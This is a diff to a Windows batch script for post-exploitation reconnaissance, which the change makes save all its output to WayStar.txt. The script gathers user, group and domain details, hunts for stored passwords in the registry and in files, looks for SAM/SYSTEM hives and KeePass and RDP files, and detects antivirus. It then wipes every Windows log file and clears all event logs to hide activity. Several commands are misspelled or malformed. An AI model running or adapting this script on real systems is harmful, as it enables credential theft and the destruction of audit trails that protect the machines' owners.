@@ -46,140 +46,167 @@ echo.
 echo.
 
 :: BEGINNING OF SCRIPT
-echo %blue% ..................................................... %normal%
-echo %green%             SITUATIONAL AWARENESS %normal
-echo %blue% ..................................................... %normal%
-echo .
-echo %cyan% Current user: %normal%
-echo %USERNAME%
-echo.
+echo %blue% ..................................................... %normal% >> SituationalAwareness.txt
+echo %green%             SITUATIONAL AWARENESS %normal >> SituationalAwareness.txt
+echo %blue% ..................................................... %normal% >> SituationalAwareness.txt
+echo . >> SituationalAwareness.txt
+echo %cyan% Current user: %normal% >> SituationalAwareness.txt
+echo %USERNAME% >> SituationalAwareness.txt
+echo. >> SituationalAwareness.txt
 
-echo %cyan% Does powershell exist? %normal%
+echo %cyan% Does powershell exist? %normal% >> SituationalAwareness.txt
 :: check to see if powershell exists
-REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion 
-echo.
+REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion >> SituationalAwareness.txt
+echo. >> SituationalAwareness.txt
 
-echo %cyan% Date of last reboot: %normal%
-dir /a c:\pagefile.sys
-echo.
+echo %cyan% Date of last reboot: %normal% >> SituationalAwareness.txt
+dir /a c:\pagefile.sys >> SituationalAwareness.txt
+echo. >> SituationalAwareness.txt
 
-echo %cyan% Commands run at startup: %normal%
-wmic startup get caption,command
+echo %cyan% Commands run at startup: %normal% >> SituationalAwareness.txt
+wmic startup get caption,command >> SituationalAwareness.txt
 
-echo %blue% ..................................................... %normal%
-echo %green%                    OS INFORMATION %normal
-echo %blue% ..................................................... %normal%
-echo .
+type SituationalAwareness.txt
+type SituationalAwareness.txt >> WayStar.txt
+del SituationalAwareness.txt
 
-echo %green% Windows  Product Name: %normal%
-HKLM\Software\Microsoft\Windows NT\CurrentVersion /v ProductName
-echo %green% Windows  Install Date: %normal%
-HKLM\Software\Microsoft\Windows NT\CurrentVersion /v InstallDate
-echo %green% Windows  Registered Owner: %normal%
-HKLM\Software\Microsoft\Windows NT\CurrentVersion /v RegisteredOwner
-echo %green% Windows  System Root: %normal%
-HKLM\Software\Microsoft\Windows NT\CurrentVersion /v SystemRoot
-echo.
+echo %blue% ..................................................... %normal% >> OsInfo.txt
+echo %green%                    OS INFORMATION %normal >> OsInfo.txt
+echo %blue% ..................................................... %normal% >> OsInfo.txt
+echo . >> OsInfo.txt
 
-echo %cyan% Version and system info: %normal%
-ver
-echo.
-systeminfo
-echo.
+echo %green% Windows  Product Name: %normal% >> OsInfo.txt
+HKLM\Software\Microsoft\Windows NT\CurrentVersion /v ProductName >> OsInfo.txt
+echo %green% Windows  Install Date: %normal% >> OsInfo.txt
+HKLM\Software\Microsoft\Windows NT\CurrentVersion /v InstallDate >> OsInfo.txt
+echo %green% Windows  Registered Owner: %normal% >> OsInfo.txt
+HKLM\Software\Microsoft\Windows NT\CurrentVersion /v RegisteredOwner >> OsInfo.txt
+echo %green% Windows  System Root: %normal% >> OsInfo.txt
+HKLM\Software\Microsoft\Windows NT\CurrentVersion /v SystemRoot >> OsInfo.txt
+echo. >> OsInfo.txt
+
+echo %cyan% Version and system info: %normal% >> OsInfo.txt
+ver >> OsInfo.txt
+echo. >> OsInfo.txt
+systeminfo >> OsInfo.txt
+echo. >> OsInfo.txt
+
+type OsInfo.txt
+type OsInfo.txt >> WayStar.txt
+del OsInfo.txt
  
 
-echo %blue% ..................................................... %normal%
-echo %green%            USERS, ACCOUNTS, AND GROUPS %normal
-echo %blue% ..................................................... %normal%
-echo .
+echo %blue% ..................................................... %normal% >> Users.txt
+echo %green%            USERS, ACCOUNTS, AND GROUPS %normal >> Users.txt 
+echo %blue% ..................................................... %normal% >> Users.txt
+echo . >> Users.txt
 
-echo %cyan% Admins: %normal%
-net localgroup administrators
-echo.
+echo %cyan% Admins: %normal% >> Users.txt
+net localgroup administrators >> Users.txt
+echo. >> Users.txt
 
-%cyan% Users: %normal%
-net users 
-echo.
-echo %green% Useful Users: %normal%
-dsquery * -filter "(objectclass=user)" -attr name dnshostname samaccountname description -limit 0
-echo.
+%cyan% Users: %normal% >> Users.txt
+net users >> Users.txt
+echo. >> Users.txt
+echo %green% Useful Users: %normal% >> Users.txt
+dsquery * -filter "(objectclass=user)" -attr name dnshostname samaccountname description -limit 0 >> Users.txt
+echo. >> Users.txt
 
-echo %cyan% Groups: %normal%
-net localgroup
-echo.
-echo %green% Useful Groups: %normal%
-dsquery * -filter "(objectclass=group)" -attr name dnshostname samaccountname description -limit 0
-echo.
+echo %cyan% Groups: %normal% >> Users.txt
+net localgroup >> Users.txt
+echo. >> Users.txt
+echo %green% Useful Groups: %normal% >> Users.txt
+dsquery * -filter "(objectclass=group)" -attr name dnshostname samaccountname description -limit 0 >> Users.txt
+echo. >> Users.txt
 
-echo %cyan% Accounts: %normal%
-net accounts
-echo.
+echo %cyan% Accounts: %normal% >> Users.txt
+net accounts >> Users.txt
+echo. >> Users.txt
 
-echo %green% Useful Computers: %normal%
-dsquery * -filter "(objectclass=computer)" -attr name dnshostname operatingsystem description -limit 0
+echo %green% Useful Computers: %normal% >> Users.txt
+dsquery * -filter "(objectclass=computer)" -attr name dnshostname operatingsystem description -limit 0 >> Users.txt
 
-echo %blue% ..................................................... %normal%
-echo %green%                   PASSWORDS %normal
-echo %blue% ..................................................... %normal%
-echo .
+type Users.txt
+type Users.txt >> WayStar.txt
+del Users.txt
 
-echo %cyan% HKLM and HKCU: %normal%
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul ^| findstr "DefaultUserName DefaultDomainName DefaultPassword" 
-reg query HKLM /f password /t REG_SZ /s /k
-reg query HKCU /f password /t REG_SZ /s /k
-reg query "HKCU\Software\ORL\WinVNC3\Password" 
-reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" 
-reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" 
-reg query HKLM if /fd password /t REG_SZ /s
-echo.
+echo %blue% ..................................................... %normal% >> Passwords.txt
+echo %green%                   PASSWORDS %normal >> Passwords.txt
+echo %blue% ..................................................... %normal% >> Passwords.txt
+echo . >> Passwords.txt
 
-:: searches passwords for cleartext paswswords
-%cyan% Cleartext Passwords: %normal%
-dir /s /b *pass* *cred* *vnc* *.config*
-findstr /SI password *.txt
+echo %cyan% HKLM and HKCU: %normal% >> Passwords.txt
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul ^| findstr "DefaultUserName DefaultDomainName DefaultPassword"  >> Passwords.txt
+reg query HKLM /f password /t REG_SZ /s /k >> Passwords.txt
+reg query HKCU /f password /t REG_SZ /s /k >> Passwords.txt
+reg query "HKCU\Software\ORL\WinVNC3\Password"  >> Passwords.txt
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  >> Passwords.txt
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"  >> Passwords.txt
+reg query HKLM if /fd password /t REG_SZ /s >> Passwords.txt
+echo. >> Passwords.txt
 
+:: searches passwords for cleartext passwords
+%cyan% Cleartext Passwords: %normal% >> Passwords.txt
+dir /s /b *pass* *cred* *vnc* *.config* >> Passwords.txt
+findstr /SI password *.txt >> Passwords.txt
 
-echo %blue% ..................................................... %normal%
-echo %green%               SECURITY DETECTION  %normal
-echo %blue% ..................................................... %normal%
-echo .
-
-echo %red% Antivirus detection: %normal%
-WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName
-echo.
-
-echo %blue% ..................................................... %normal%
-echo %green%                SCHED TASKS AND FILES %normal
-echo %blue% ..................................................... %normal%
-echo .
-
-echo %cyan% Scheduled tasks: %normal%
-schtasks /query /fo LIST /v ^| findstr "TaskName Author: Run: User:"
-schtasks/query
-
-echo %cyan% SAM and SYSTEM files: %normal%
-dir %SYSTEMROOT%\repair\SAM 2>nul
-dir %SYSTEMROOT%\System32\config\RegBack\SAM 2>nul
-dir %SYSTEMROOT%\System32\config\SAM 2>nul
-dir %SYSTEMROOT%\repair\system 2>nul
-dir %SYSTEMROOT%\System32\config\SYSTEM 2>nul
-dir %SYSTEMROOT%\System32\config\RegBack\system 2>nul
-dir /a /b /s SAM.b*
-echo.
-
-echo %cyan% Vnc, kdbx, or rdp files: %normal%
-dir /a /s /b *.kdbx *vnc.ini *.rdp
-echo.
+type Passwords.txt
+type Passwords.txt >> WayStar.txt
+del Passwords.txt
 
 
-echo %cyan% Folders with weak permissions: %normal%
-icalcs "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
-icalcs "C:\Program Files (x86)\*" 2>nul" 2>nul | findstr "(F)" | findstr "Everyone"
-icalcs "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
-echo.
+echo %blue% ..................................................... %normal% >> Security.txt
+echo %green%               SECURITY DETECTION  %normal  >> Security.txt
+echo %blue% ..................................................... %normal% >> Security.txt
+echo . >> Security.txt
 
+echo %red% Antivirus detection: %normal% >> Security.txt
+WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName >> Security.txt
+echo. >> Security.txt
+
+type Security.txt
+typr Security.txt >> WayStar.txt
+del Security.txt
+
+echo %blue% ..................................................... %normal% >> Files.txt
+echo %green%                SCHED TASKS AND FILES %normal  >> Files.txt
+echo %blue% ..................................................... %normal% >> Files.txt
+echo . >> Files.txt
+
+echo %cyan% Scheduled tasks: %normal% >> Files.txt
+schtasks /query /fo LIST /v ^| findstr "TaskName Author: Run: User:" >> Files.txt
+schtasks/query >> Files.txt
+
+echo %cyan% SAM and SYSTEM files: %normal% >> Files.txt
+dir %SYSTEMROOT%\repair\SAM 2>nul >> Files.txt
+dir %SYSTEMROOT%\System32\config\RegBack\SAM 2>nul >> Files.txt
+dir %SYSTEMROOT%\System32\config\SAM 2>nul >> Files.txt
+dir %SYSTEMROOT%\repair\system 2>nul >> Files.txt
+dir %SYSTEMROOT%\System32\config\SYSTEM 2>nul >> Files.txt
+dir %SYSTEMROOT%\System32\config\RegBack\system 2>nul >> Files.txt
+dir /a /b /s SAM.b* >> Files.txt
+echo. >> Files.txt
+
+echo %cyan% Vnc, kdbx, or rdp files: %normal% >> Files.txt
+dir /a /s /b *.kdbx *vnc.ini *.rdp >> Files.txt
+echo. >> Files.txt
+
+echo %cyan% Folders with weak permissions: %normal% >> Files.txt
+icalcs "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone" >> Files.txt
+icalcs "C:\Program Files (x86)\*" 2>nul" 2>nul | findstr "(F)" | findstr "Everyone" >> Files.txt
+icalcs "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" >> Files.txt
+icalcs "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" >> Files.txt
+echo. >> Files.txt
+
+type Files.txt
+type Files.txt >> WayStar.txt
+del Files.txt
+
+:: cleaning files
 del %WINDIR%\*.log /a /s /q /f
 for /f %a in ('wevtutil el') do @wevtutil cl "%a"
+
+echo %red% All contents saved to WayStar.txt %normal%
 
 echo %blue% ..................................................... %normal%
 echo %green%                 Other Stuff to add %normal
@@ -219,4 +246,5 @@ Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 echo.
 
 
+echo %red% All contents saved to WayStar.txt %normal%
 
